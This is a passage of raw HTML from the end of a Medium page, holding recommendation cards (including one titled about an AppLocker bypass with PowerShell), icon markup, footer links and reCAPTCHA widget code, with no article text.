1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>295</span></div></div></div></div><div><div class="ac" aria-describedby="134" aria-labelledby="134" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r za"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#6B6B6B" aria-labelledby="response-filled-16px-desc" viewBox="0 0 16 16"><desc id="response-filled-16px-desc">A response icon</desc><path fill="#6B6B6B" d="M12.344 11.458A5.28 5.28 0 0 0 14 7.526C14 4.483 11.391 2 8.051 2S2 4.483 2 7.527c0 3.051 2.712 5.526 6.059 5.526a6.6 6.6 0 0 0 1.758-.236q.255.223.554.414c.784.51 1.626.768 2.512.768a.37.37 0 0 0 .355-.214.37.37 0 0 0-.03-.384 4.7 4.7 0 0 1-.857-1.958v.014z"></path></svg><span>10</span></div></div></div></div></a></div></div></div><div class="ac r afk afl"><div class="afj"></div><div class=""><div><div class="bn" aria-describedby="135" aria-labelledby="135" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fd75af50c0122&amp;operation=register&amp;redirect=https%3A%2F%2Fmeetcyber.net%2Fthe-10-most-dangerous-hacking-devices-d75af50c0122&amp;source=---read_next_recirc--3229b75618f7----2-----------------bookmark_preview----ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><span class="afj"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb lu" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span><div class="k j e"><div class="ty bi va lo"></div></div></div></div></div></div></div></div></article></div></div><div class="abe abf abg tc abh abi abj tb abk abl abm abn abo abp abq abr abs abt abu abv abw"><div class="abx aby abz aca acb ed m"><article class="ed" data-testid="post-preview"><div class="ed rv m"><div class="bi ed"><div class="ed m"><div class="fr ed acc acd ace acf acg ach aci acj ack acl acm acn aco" role="link" data-href="https://medium.com/@R3dLevy/evading-windows-security-a-story-of-applocker-bypass-technique-with-powershell-0cfc689a5916" tabindex="0"><div class="acp"><div aria-label="Evading Windows Security: A Story of AppLocker Bypass Technique with PowerShell"><div class="acr acs act acu cc"><img alt="Evading Windows Security: A Story of AppLocker Bypass Technique with PowerShell" class="bi acv acw acx bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/0*lE1Vn4n4nSdhF1dL.png"></div></div></div><div class="acq ac ci cv"><div class="ac cv xv bi acy acz ada adb"><div class="adc add ade adf adg ac r"><div class="rm m"><div class="m"><div><div class="m" aria-describedby="136" aria-labelledby="136" role="tooltip"><div tabindex="-1" class="bf"><a tabindex="-1" rel="noopener follow" href="https://medium.com/@R3dLevy?source=post_page---read_next_recirc--3229b75618f7----3---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><div class="m fr"><img alt="R3dLevy" class="m fk by adh adi de" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*dGw6joxOuLZ0s8ygPWmixA.png"><div class="gj by m adh adi fw o ak gk"></div></div></a></div></div></div></div></div><div><div class="m" aria-describedby="137" aria-labelledby="137" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at jg ac r" rel="noopener follow" href="https://medium.com/@R3dLevy?source=post_page---read_next_recirc--3229b75618f7----3---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><p class="bg b ec ab ga zc zd ze zf zg zh zi bl">R3dLevy</p></a></div></div></div></div><div class="adj m adk adl adm adn ado he"></div><span class="bg b ec ab eb"><div class="ss ac cw ag"><div class="ac r afh"><span>Oct 22, 2025</span><div class=""><div class="fr aff do ac r"><div class="fw xb afg ac r afh"><div class="fn do afi m de"></div></div><a class="fw lp afg ac r afh" tabindex="-1" rel="noopener follow" href="https://medium.com/@R3dLevy/evading-windows-security-a-story-of-applocker-bypass-technique-with-powershell-0cfc689a5916?source=post_page---read_next_recirc--3229b75618f7----3---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><div><div class="ac" aria-describedby="228" aria-labelledby="228" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r za"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>6</span></div></div></div></div></a></div></div></div><div class="ac r afk afl"><div class="afj"></div><div class=""><div><div class="bn" aria-describedby="138" aria-labelledby="138" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F0cfc689a5916&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40R3dLevy%2Fevading-windows-security-a-story-of-applocker-bypass-technique-with-powershell-0cfc689a5916&amp;source=---read_next_recirc--3229b75618f7----3-----------------bookmark_preview----ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><span class="afj"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb lu" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span></div></div></div></div></div></div></article></div></div></div><div class="ty bi va dr ds afm afn afo"></div><a class="bg b bh ab bl rn uj uk ul lu lr um fc fd fe un uo up fh uq ur us ut uu fi fj fk bn fl fm" rel="noopener follow" href="https://medium.com/?source=post_page---read_next_recirc--3229b75618f7---------------------------------------" data-discover="true"><div class="m fm">See more recommendations</div></a></div></div></div><div class="i l k"><div class="ty bi va vb"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="vc ac kr ji"><div class="vd ve m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://help.medium.com/hc/en-us?source=post_page-----3229b75618f7---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Help</p></a></div><div class="vd ve m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://status.medium.com/?source=post_page-----3229b75618f7---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Status</p></a></div><div class="vd ve m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/about?autoplay=1&amp;source=post_page-----3229b75618f7---------------------------------------" data-discover="true"><p class="bg b ec ab eb">About</p></a></div><div class="vd ve m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----3229b75618f7---------------------------------------" data-discover="true"><p class="bg b ec ab eb">Careers</p></a></div><div class="vd ve m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="mailto:pressinquiries@medium.com" rel="noopener follow"><p class="bg b ec ab eb">Press</p></a></div><div class="vd ve m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://blog.medium.com/?source=post_page-----3229b75618f7---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Blog</p></a></div><div class="vd ve m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----3229b75618f7---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Privacy</p></a></div><div class="vd ve m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----3229b75618f7---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Rules</p></a></div><div class="vd ve m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----3229b75618f7---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Terms</p></a></div><div class="vd m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://speechify.com/medium?source=post_page-----3229b75618f7---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Text to speech</p></a></div></div></div></div></div></div></div></div></div></div></div></div>





































<div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div>
<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><div title="reCAPTCHA" width="256" height="60" role="presentation" name="a-aabxs0lm5957" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/enterprise/anchor?ar=1&amp;k=6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp&amp;co=aHR0cHM6Ly9tZWRpdW0uY29tOjQ0Mw..&amp;hl=en&amp;v=vUgXt_KV952_-5BB2jjloYzl&amp;size=invisible&amp;anchor-ms=20000&amp;execute-ms=30000&amp;cb=fwc11fh32n2t" data-original-tag="iframe">

<title>reCAPTCHA</title>

<link rel="stylesheet" type="text/css" href="https://www.gstatic.com/recaptcha/releases/vUgXt_KV952_-5BB2jjloYzl/styles__ltr.css">


<div id="rc-anchor-alert" class="rc-anchor-alert"></div>

<div class="rc-anchor rc-anchor-invisible rc-anchor-light  rc-anchor-invisible-hover"><div id="recaptcha-accessible-status" class="rc-anchor-aria-status" aria-hidden="true">Recaptcha requires verification. </div><div class="rc-anchor-error-msg-container" style="display:none"><span class="rc-anchor-error-msg" aria-hidden="true"></span></div><div class="rc-anchor-normal-footer"><div class="rc-anchor-logo-large" role="presentation"><div class="rc-anchor-logo-img rc-anchor-logo-img-large"></div></div><div class="rc-anchor-pt"><a href="https://www.google.com/intl/en/policies/privacy/" target="_blank">Privacy</a><span aria-hidden="true" role="presentation"> - </span><a href="https://www.google.com/intl/en/policies/terms/" target="_blank">Terms</a></div></div><div class="rc-anchor-invisible-text"><span>protected by <strong>reCAPTCHA</strong></span><div class="rc-anchor-pt"><a href="https://www.google.com/intl/en/policies/privacy/" target="_blank" style="">Privacy</a><span aria-hidden="true" role="presentation"> - </span><a href="https://www.google.com/intl/en/policies/terms/" target="_blank" style="">Terms</a></div></div></div><div style="display: none;" data-original-tag="iframe"></div></div></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><div style="display: none;" data-original-tag="iframe"></div></div></body></html>